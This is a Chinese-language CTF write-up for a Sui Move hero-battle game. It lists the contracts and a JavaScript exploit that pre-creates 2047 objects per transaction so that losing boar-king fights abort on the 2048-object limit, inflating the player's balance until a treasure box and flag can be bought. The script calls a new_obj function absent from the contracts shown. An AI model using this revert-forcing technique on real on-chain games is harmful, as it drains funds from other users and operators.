# 实践：利用交互实现攻击
## 题目描述
这是一个基于Sui Move开发的英雄冒险游戏。在这个游戏中，玩家可以控制一个英雄角色，与野猪和野猪王进行战斗，获取经验值和装备，提升自己的等级和能力。游戏包含了完整的战斗系统、物品系统和随机数生成机制。

## 示例代码
以下是game::adventure模块的代码，这个合约主要是创建怪兽和打怪兽的函数，最后还有一个买宝箱的函数：
```move
module game::adventure {
    use game::inventory;
    use game::hero::{Self, Hero};
    use ctf::random;
    use sui::event;
    use sui::object::{Self, ID, UID};
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use sui::clock;
    use sui::table::{Self, Table};

    struct Monster<phantom T> has key {
        id: UID,
        hp: u64,
        strength: u64,
        defense: u64,
    }

    struct Boar {}
    struct BoarKing {}

    struct SlainEvent<phantom T> has copy, drop {
        slayer_address: address,
        hero: ID,
        boar: ID,
    }

    const EHERO_TIRED: u64 = 1;
    const ENO_SWORD: u64 = 4;
    const ENO_ARMOR: u64 = 5;
    const ERROR_NO_MONEY: u64 = 6;
    const ERROR_NO_TOKEN:u64 = 10;


    const BOAR_MIN_HP: u64 = 80;
    const BOAR_MAX_HP: u64 = 120;
    const BOAR_MIN_STRENGTH: u64 = 5;
    const BOAR_MAX_STRENGTH: u64 = 15;
    const BOAR_MIN_DEFENSE: u64 = 4;
    const BOAR_MAX_DEFENSE: u64 = 6;

    const BOARKING_MIN_HP: u64 = 180;
    const BOARKING_MAX_HP: u64 = 220;
    const BOARKING_MIN_STRENGTH: u64 = 20;
    const BOARKING_MAX_STRENGTH: u64 = 25;
    const BOARKING_MIN_DEFENSE: u64 = 10;
    const BOARKING_MAX_DEFENSE: u64 = 15;

    struct NoUse has key{
        id: UID,
        value: u64,
    }

    struct UsersTokenAmount has key ,store{
        id: UID,
        balances: Table<address, u64>
    }
    struct Amount has copy, drop {
        amount: u64
    }
  
    fun init(ctx: &mut TxContext) {
        let id = object::new(ctx);
        let usersTokenAmount = UsersTokenAmount {
            id: id,
            balances: table::new<address, u64>(ctx)
        };
        transfer::public_share_object(usersTokenAmount);
    }

    fun create_monster<T>(
        min_hp: u64, max_hp: u64,
        min_strength: u64, max_strength: u64,
        min_defense: u64, max_defense: u64,
        ctx: &mut TxContext
    ): Monster<T> { 
        let id = object::new(ctx);       
        let hp = random::rand_u64_range(min_hp, max_hp, ctx);
        let strength = random::rand_u64_range(min_strength, max_strength, ctx);
        let defense = random::rand_u64_range(min_defense, max_defense, ctx);
        Monster<T> {
            id,
            hp,
            strength,
            defense,
        }
    }

    fun fight_monster<T>(hero: &Hero, monster: &Monster<T>): u64 {
        let hero_strength = hero::strength(hero);
        let hero_defense = hero::defense(hero);
        let hero_hp = hero::hp(hero);
        let monster_hp = monster.hp;
        let cnt = 0u64; 
        let rst = 0u64; 
        while (monster_hp > 0) {
            let damage = if (hero_strength > monster.defense) {
                hero_strength - monster.defense
            } else {
                0
            };
            if (damage < monster_hp) {
                monster_hp = monster_hp - damage;
                let damage = if (monster.strength > hero_defense) {
                    monster.strength - hero_defense
                } else {
                    0
                };
                if (damage >= hero_hp) {
                    rst = 2;
                    break
                } else {
                    hero_hp = hero_hp - damage;
                }
            } else {
                rst = 1;
                break
            };
            cnt = cnt + 1;
            if (cnt > 20) {
                break
            }
        };
        rst
    }

    public entry fun slay_boar(hero: &mut Hero, ctx: &mut TxContext) {
        assert!(hero::stamina(hero) > 0, EHERO_TIRED);
        let boar = create_monster<Boar>(
            BOAR_MIN_HP, BOAR_MAX_HP,
            BOAR_MIN_STRENGTH, BOAR_MAX_STRENGTH,
            BOAR_MIN_DEFENSE, BOAR_MAX_DEFENSE,
            ctx
        );
        let fight_result = fight_monster<Boar>(hero, &boar);
        hero::decrease_stamina(hero, 1);
     
        if (fight_result == 1) {
            hero::increase_experience(hero, 10);

            let d100 = random::rand_u64_range(0, 100, ctx);
            if (d100 < 10) {
                let sword = inventory::create_sword(ctx);
                hero::equip_or_levelup_sword(hero, sword, ctx);
            } else if (d100 < 20) {
                let armor = inventory::create_armor(ctx);
                hero::equip_or_levelup_armor(hero, armor, ctx);
            };
        };
        
        event::emit(SlainEvent<Boar> {
            slayer_address: tx_context::sender(ctx),
            hero: hero::id(hero),
            boar: object::uid_to_inner(&boar.id),
        });
        let Monster<Boar> { id, hp: _, strength: _, defense: _} = boar;
        object::delete(id);
    }

    public entry fun init_balances(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext){
        let sender = tx_context::sender(ctx);
        if (!table::contains(&usersTokenAmount.balances, sender)) {
                table::add(&mut usersTokenAmount.balances, sender, 100);
        }else{
            let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
            *current_balance = 100;
        }
    }

    entry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {
        let sender = tx_context::sender(ctx);
        assert!(hero::stamina(hero) > 0, EHERO_TIRED);
        let boar = create_monster<BoarKing>(
            BOARKING_MIN_HP, BOARKING_MAX_HP,
            BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH,
            BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE,
            ctx
        );
        let fight_result = fight_monster<BoarKing>(hero, &boar);
        //hero::decrease_stamina(hero, 2);

        if (fight_result == 1) { 
            let current_timestamp = clock::timestamp_ms(clock);
            let d100 = current_timestamp % 3;

            if (d100 == 1) {
                let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
                *current_balance = *current_balance + 5;
                event::emit(Amount{amount: *current_balance});
            }else{  
                let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
                *current_balance = *current_balance - 5;
                event::emit(Amount{amount: *current_balance});
               
                let obj = NoUse {
                    id: object::new(ctx),
                    value: 100,
                };
                transfer::transfer(obj, tx_context::sender(ctx));
                
            };
        };

        event::emit(SlainEvent<BoarKing> {
            slayer_address: tx_context::sender(ctx),
            hero: hero::id(hero),
            boar: object::uid_to_inner(&boar.id),
        });
        let Monster<BoarKing> { id, hp: _, strength: _, defense: _} = boar;
        object::delete(id);
    }

    public entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount ,ctx: &mut TxContext) {
        let sender = tx_context::sender(ctx);
        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
        event::emit(Amount{amount: *current_balance});
        assert!(*current_balance >= 200,ERROR_NO_MONEY);
         *current_balance = *current_balance - 100;
        let box = inventory::create_treasury_box(ctx);
        transfer::public_transfer(box, tx_context::sender(ctx));
    }

    public fun get_balances(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext): u64{
        let sender = tx_context::sender(ctx);
        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
        *current_balance
    }

}
```
以下是game::hero模块的代码，这个合约是查看英雄属性，给英雄配置装备的一些函数：
```move
module game::hero {
    use game::inventory::{Self, Sword, Armor};

    use sui::object::{Self, ID, UID};
    use sui::transfer;
    use sui::tx_context::TxContext;
    use std::option::{Self, Option};

    friend game::adventure;


    struct Hero has key, store {
        id: UID,
        level: u64,
        stamina: u64,
        hp: u64,
        experience: u64,
        strength: u64,
        defense: u64,
        sword: Option<Sword>,
        armor: Option<Armor>,
    }

    const MAX_LEVEL: u64 = 2;
    const INITAL_HERO_HP: u64 = 100;
    const INITIAL_HERO_STRENGTH: u64 = 10;
    const INITIAL_HERO_DEFENSE: u64 = 5;
    const HERO_STAMINA: u64 = 200;

    const EBOAR_WON: u64 = 0;
    const EHERO_TIRED: u64 = 1;
    const ENOT_ADMIN: u64 = 2;
    const EINSUFFICIENT_FUNDS: u64 = 3;
    const ENO_SWORD: u64 = 4;
    const ENO_ARMOR: u64 = 5;
    const ASSERT_ERR: u64 = 6;
    const EHERO_REACH_MAX_LEVEL: u64 = 7;

    fun init(ctx: &mut TxContext) {
        let hero = create_hero(ctx);
        transfer::share_object(hero);
    }

    public(friend) fun create_hero(ctx: &mut TxContext): Hero {
        Hero {
            id: object::new(ctx),
            level: 1,
            stamina: HERO_STAMINA,
            hp: INITAL_HERO_HP,
            experience: 0,
            strength: INITIAL_HERO_STRENGTH,
            defense: INITIAL_HERO_DEFENSE,
            sword: option::none(),
            armor: option::none(),
        }
    }

    public fun strength(hero: &Hero): u64 {
        if (hero.hp == 0) {
            return 0
        };

        let sword_strength = if (option::is_some(&hero.sword)) {
            inventory::strength(option::borrow(&hero.sword))
        } else {
            0
        };
        hero.strength + sword_strength
    }

    public fun defense(hero: &Hero): u64 {
        if (hero.hp == 0) {
            return 0
        };

        let armor_defense = if (option::is_some(&hero.armor)) {
            inventory::defense(option::borrow(&hero.armor))
        } else {
            0
        };
        hero.defense + armor_defense
    }

    public fun hp(hero: &Hero): u64 {
        hero.hp
    }

    public fun experience(hero: &Hero): u64 {
        hero.experience
    }

    public fun stamina(hero: &Hero): u64 {
        hero.stamina
    }

    public(friend) fun increase_experience(hero: &mut Hero, experience: u64) {
        hero.experience = hero.experience + experience;
    }

    public(friend) fun id(hero: &Hero): ID {
        object::uid_to_inner(&hero.id)
    }

    public(friend) fun decrease_stamina(hero: &mut Hero, stamina: u64) {
        hero.stamina = hero.stamina - stamina;
    }

    public entry fun level_up(hero: &mut Hero) {
        assert!(hero.level < MAX_LEVEL, EHERO_REACH_MAX_LEVEL);
        if (hero.experience >= 100) {
            hero.level = hero.level + 1;
            hero.strength = hero.strength + INITIAL_HERO_STRENGTH*3;
            hero.defense = hero.defense + INITIAL_HERO_DEFENSE*3;
            hero.hp = hero.hp + INITAL_HERO_HP;
            hero.experience = hero.experience - 100;
        }
    }

    public fun equip_or_levelup_sword(hero: &mut Hero, new_sword: Sword, ctx: &mut TxContext) {
        let sword = if (option::is_some(&hero.sword)) {
            let sword = option::extract(&mut hero.sword);
            inventory::level_up_sword(&mut sword, new_sword, ctx);
            sword
        } else {
            new_sword
        };
        option::fill(&mut hero.sword, sword);
    }


    public fun remove_sword(hero: &mut Hero): Sword {
        assert!(option::is_some(&hero.sword), ENO_SWORD);
        option::extract(&mut hero.sword)
    }

    public fun equip_or_levelup_armor(hero: &mut Hero, new_armor: Armor, ctx: &mut TxContext) {
        let armor = if (option::is_some(&hero.armor)) {
            let armor = option::extract(&mut hero.armor);
            inventory::level_up_armor(&mut armor, new_armor, ctx);
            armor
        } else {
            new_armor
        };
        option::fill(&mut hero.armor, armor);
    }


    public fun remove_armor(hero: &mut Hero): Armor {
        assert!(option::is_some(&hero.armor), ENO_ARMOR);
        option::extract(&mut hero.armor)
    }

    public fun destroy_hero(hero: Hero) {
        let Hero {id, level: _, stamina: _, hp: _, experience: _, strength: _, defense: _, sword, armor} = hero;
        object::delete(id);
        if (option::is_some(&sword)) {
            let sword = option::destroy_some(sword);
            inventory::destroy_sword(sword);
        } else {
            option::destroy_none(sword);
        };
        if (option::is_some(&armor)) {
            let armor = option::destroy_some(armor);
            inventory::destroy_armor(armor);
        } else {
            option::destroy_none(armor);
        };
    }
}
```
以下是game::inventory模块的代码，这个合约主要是升级装备，查看装备属性的函数，最后还有一个获取flag的函数：
```move
module game::inventory {
    use ctf::random;
    
    use sui::object::{Self, UID};
    use sui::tx_context::{Self, TxContext};
    use sui::event;

    friend game::adventure;

    const MAX_RARITY: u64 = 5;
    const BASE_SWORD_STRENGTH: u64 = 2;
    const BASE_ARMOR_DEFENSE: u64 = 1;

    struct Sword has store {
        rarity: u64,
        strength: u64,
    }

    struct Armor has store {
        rarity: u64,
        defense: u64,
    }

    struct TreasuryBox has key, store {
        id: UID,
    }

    struct Flag has copy, drop {
        user: address,
        flag: bool
    }

    public(friend) fun create_treasury_box(ctx: &mut TxContext): TreasuryBox {
        TreasuryBox {
            id: object::new(ctx)
        }
    }

    public(friend) fun create_sword(_ctx: &mut TxContext): Sword {
        Sword {
            rarity: 1,
            strength: BASE_SWORD_STRENGTH,
        }
    }

    public fun destroy_sword(sword: Sword) {
        let Sword { rarity: _, strength: _} = sword;
    }

    public(friend) fun create_armor(_ctx: &mut TxContext): Armor {
        Armor {
            rarity: 1,
            defense: BASE_ARMOR_DEFENSE,
        }
    }

    public fun destroy_armor(armor: Armor) {
        let Armor { rarity: _, defense: _} = armor;
    }

    public fun strength(sword: &Sword): u64 {
        sword.strength * sword.rarity
    }

    public fun defense(armor: &Armor): u64 {
        armor.defense * armor.rarity
    }  

    public fun sword_rarity(sword: &Sword): u64 {
        sword.rarity
    }

    public fun armor_rarity(armor: &Armor): u64 {
        armor.rarity
    }

    public fun level_up_sword(sword: &mut Sword, material: Sword, ctx: &mut TxContext) {
        if (sword.rarity < MAX_RARITY) {
            let prob = random::rand_u64_range(0, sword.rarity, ctx);
            if (prob < 1) {
                sword.rarity = sword.rarity + 1;
            }
        };
        destroy_sword(material);
    }

    public fun level_up_armor(armor: &mut Armor, material: Armor, ctx: &mut TxContext) {
        if (armor.rarity < MAX_RARITY) {
            let prob = random::rand_u64_range(0, armor.rarity, ctx);
            if (prob < 1) {
                armor.rarity = armor.rarity + 1;
            }
        };
        destroy_armor(material);
    }

    public entry fun get_flag(box: TreasuryBox, ctx: &mut TxContext) {
        let TreasuryBox { id } = box;
        object::delete(id);
        event::emit(Flag { user: tx_context::sender(ctx), flag: true });
    }
}
```
以下是ctf::random模块的代码，这个合约主要是生成随机数的合约：
```move
module ctf::random {
    use std::hash;
    use std::vector;

    use sui::bcs;
    use sui::object;
    use sui::tx_context::TxContext;
    use std::debug;
    use sui::event;
    
    const ERR_HIGH_ARG_GREATER_THAN_LOW_ARG: u64 = 101;
    
    fun seed(ctx: &mut TxContext): vector<u8> {
        let ctx_bytes = bcs::to_bytes(ctx);
        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, ctx_bytes);
        let hash: vector<u8> = hash::sha3_256(info);
        hash
        
    }

    fun bytes_to_u64(bytes: vector<u8>): u64 {
        let value = 0u64;
        let i = 0u64;
        while (i < 8) {
            value = value | ((*vector::borrow(&bytes, i) as u64) << ((8 * (7 - i)) as u8));
            i = i + 1;
        };
        return value
    }

    fun rand_u64_with_seed(_seed: vector<u8>): u64 {
        bytes_to_u64(_seed)
    }

    fun rand_u64_range_with_seed(_seed: vector<u8>, low: u64, high: u64): u64 {
        assert!(high > low, ERR_HIGH_ARG_GREATER_THAN_LOW_ARG);
        let value = rand_u64_with_seed(_seed);
        (value % (high - low)) + low
    }

    public fun rand_u64(ctx: &mut TxContext): u64 {
        rand_u64_with_seed(seed(ctx))
    }

    public fun rand_u64_range(low: u64, high: u64, ctx: &mut TxContext): u64 {
        rand_u64_range_with_seed(seed(ctx), low, high)
    }
}
```
## 任务目标
理解代码，通过代码中的漏洞，构造攻击链，拿到box。
```move
public entry fun get_flag(box: TreasuryBox, ctx: &mut TxContext) {
    let TreasuryBox { id } = box;
    object::delete(id);
    event::emit(Flag { user: tx_context::sender(ctx), flag: true });
}
```
## 题目中的漏洞
没有考虑PTB交易一次最多创建2048个对象，输的逻辑比赢得逻辑多一个对象，可以通过让对象达到2048的阀值，导致后面只能走赢得逻辑才会成功上链。
```move
if (d100 == 1) {
    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
    *current_balance = *current_balance + 5;
    event::emit(Amount{amount: *current_balance});
}else{  
    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
    *current_balance = *current_balance - 5;
    event::emit(Amount{amount: *current_balance});
               
    let obj = NoUse {
        id: object::new(ctx),
        value: 100,
     };
    transfer::transfer(obj, tx_context::sender(ctx));    
};
```

## 解题思路
可以看到我们要获取flag就必须先拿到box，那么怎么获取这个宝箱呢，
```move
public entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount ,ctx: &mut TxContext) {
    let sender = tx_context::sender(ctx);
    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
    event::emit(Amount{amount: *current_balance});
    assert!(*current_balance >= 200,ERROR_NO_MONEY);
    *current_balance = *current_balance - 100;
    let box = inventory::create_treasury_box(ctx);
    transfer::public_transfer(box, tx_context::sender(ctx));
}
```
这里获取box的唯一方式就是调用buy_box函数，看到这我们可以知道只要我们的balance大200，就可以购买这个宝箱，接下来我们寻找可以获得balance的函数：
```move
public entry fun init_balances(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext){
    let sender = tx_context::sender(ctx);
    if (!table::contains(&usersTokenAmount.balances, sender)) {
        table::add(&mut usersTokenAmount.balances, sender, 100);
    }else{
        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
        *current_balance = 100;
    }
}
```
第一个是在init_balances函数会为指定地址初始化一个100金额。
```move
entry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {
    let sender = tx_context::sender(ctx);
    assert!(hero::stamina(hero) > 0, EHERO_TIRED);
    let boar = create_monster<BoarKing>(
        BOARKING_MIN_HP, BOARKING_MAX_HP,
        BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH,
        BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE,
        ctx
    );
    let fight_result = fight_monster<BoarKing>(hero, &boar);

    if (fight_result == 1) { 
        let current_timestamp = clock::timestamp_ms(clock);
        let d100 = current_timestamp % 3;

        if (d100 == 1) {
            let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
            *current_balance = *current_balance + 5;
            event::emit(Amount{amount: *current_balance});
        }else{  
            let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
            *current_balance = *current_balance - 5;
            event::emit(Amount{amount: *current_balance});
               
            let obj = NoUse {
                id: object::new(ctx),
                value: 100,
            };
            transfer::transfer(obj, tx_context::sender(ctx));    
        };
    };

    event::emit(SlainEvent<BoarKing> {
        slayer_address: tx_context::sender(ctx),
        hero: hero::id(hero),
        boar: object::uid_to_inner(&boar.id),
    });
    let Monster<BoarKing> { id, hp: _, strength: _, defense: _} = boar;
    object::delete(id);
}
```
在打野猪王的时候，打赢野猪王有1/3的概率加5个balance。但是也有2/3的概率减去5个balance。
因为创建野猪王时会创建一个对象，所以我预先只需要创建2047个对象，然后创建野猪王加1就是达到2048个对象的阀值，这样就做到只有赢得逻辑才能成功上链，输的逻辑会因为多创建一个对象超过2048而一直报错。

## 题解
```js
import { Transaction } from '@mysten/sui/transactions';
import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import axios from 'axios';

const MNEMONIC = '';// 自己的助记词
const keypair = Ed25519Keypair.deriveKeypair(MNEMONIC);
const publicKey = keypair.getPublicKey();
const address = publicKey.toSuiAddress();
console.log('Wallet Address:', address);
const client = new SuiClient({ url: getFullnodeUrl('devnet') });
let balance = await client.getBalance({ owner: address });
console.log('Account Balance:', balance);
const heroId = '';// heroId
const userTokenAmountId = '';// userTokenAmountId
const PACKAGE_ID = ''; // PACKAGE_ID
const suiRpcUrl = 'https://fullnode.devnet.sui.io/';

async function get_experience() {
    try {
        const response = await axios.post(suiRpcUrl,{jsonrpc: '2.0',id: 1, method: 'sui_getObject',params: [heroId,{showType: true,showOwner: true,showDepth: true,showContent: true,showDisplay: true,},],},{headers: {'Content-Type': 'application/json',},});
        const fields = response.data.result?.data?.content?.fields;
        if (fields) {console.log('Experience:', fields.experience);console.log('Level', fields.level)} else {console.log('No fields found in the object.');}
        return fields.experience 
    } catch (error) {
        console.error('Error fetching object data:', error.message);
    }
}

async function get_transaction_events(digest) {
    try {
        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest, 
                {showInput: false,showRawInput: false,showEffects: false,showEvents: true, showObjectChanges: false,showBalanceChanges: false}
            ]
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        const events = response.data.result?.events;
        if (events && events.length > 0) {
            console.log('交易触发的事件列表:');
            let amount = null;
            for (const event of events){
                if (event.parsedJson && 'amount' in event.parsedJson) {
                    amount = parseInt(event.parsedJson.amount, 10); 
                    console.log('Amount:', amount);
                    break;
                }else{
                    console.log('事件内容:', event.parsedJson);
                }
            }
            return amount;
        } else {
            console.log('该交易没有触发任何事件。');
            return 0;
        }

    } catch (error) {
        console.error('获取交易事件失败:', error.message);
        return 0;
    }
}

async function get_newly_created_object(digest) {
    try {
        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest,
                {
                    showEffects: true,
                    showObjectChanges: true
                }
            ]
        }, {
            headers: { 'Content-Type': 'application/json' }
        });
        const result = response.data.result;
        const createdObjects = result.effects?.created || [];
        if (createdObjects.length === 0) {
            console.log('未找到新创建的对象');
            return null;
        }

        const newObjectId = createdObjects[0].reference.objectId;
        console.log('新对象 ID:', newObjectId);
        return newObjectId;

    } catch (error) {
        console.error('获取新对象失败:', error.message);
        return null;
    }
}
// 升级英雄
let i = 0;
while(i<200){
    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::adventure::slay_boar`,
        arguments: [
            tx.object(heroId),
            ]
        });
    let experience = await get_experience();
    console.log("experience: ",experience);
    if (experience >= 100){
        tx.moveCall({
            target: `${PACKAGE_ID}::hero::level_up`,
            arguments: [tx.object(heroId),]
        });
        const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
        console.log('Transaction Result:', result);
        break;
    }
    const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
    console.log('Transaction Result:', result);
}
// 初始化balances
const tx1 = new Transaction();
tx1.moveCall({
            target: `${PACKAGE_ID}::adventure::init_balances`,
            arguments: [tx1.object(userTokenAmountId),]
        });
const result1 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx1,});
console.log('Transaction Result:', result1);
// 打野猪王获取balances
while(true){
      try{
        const tx3 = new Transaction();
        let num = 2047;
        const address1 = ''// 随便写一个地址
        tx3.moveCall({
                target: `${PACKAGE_ID}::adventure::new_obj`,
                arguments: [tx3.pure.u64(num), tx3.pure.address(address1),]
            });
        tx3.moveCall({
                target: `${PACKAGE_ID}::adventure::slay_boar_king`,
                arguments: [tx3.object('0x6'), tx3.object(userTokenAmountId), tx3.object(heroId)]
            });
        const result3 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx3,});
        console.log('Transaction Result:', result3);
        let amount = await get_transaction_events(result3.digest);
        // console.log("amount: ",amount);
        if (amount >= 200) {
            break;
        }else{
            continue;
        }
     }catch(error){
         console.log("error");
         continue;
     }
}
// buy box
const tx4 = new Transaction();
tx4.moveCall({
            target: `${PACKAGE_ID}::adventure::buy_box`,
            arguments: [tx4.object(userTokenAmountId),]
        });
const result4 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx4,});
console.log('Transaction Result:', result4);
let newobjectId = await get_newly_created_object(result4.digest);
if (newobjectId != null){
    // get flag
    const tx5 = new Transaction();
    tx5.moveCall({
                target: `${PACKAGE_ID}::inventory::get_flag`,
                arguments: [tx5.object(newobjectId),]
            });
    const result5 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx5,});
    console.log('Transaction Result:', result5);
   await get_transaction_events(result5.digest);

}
```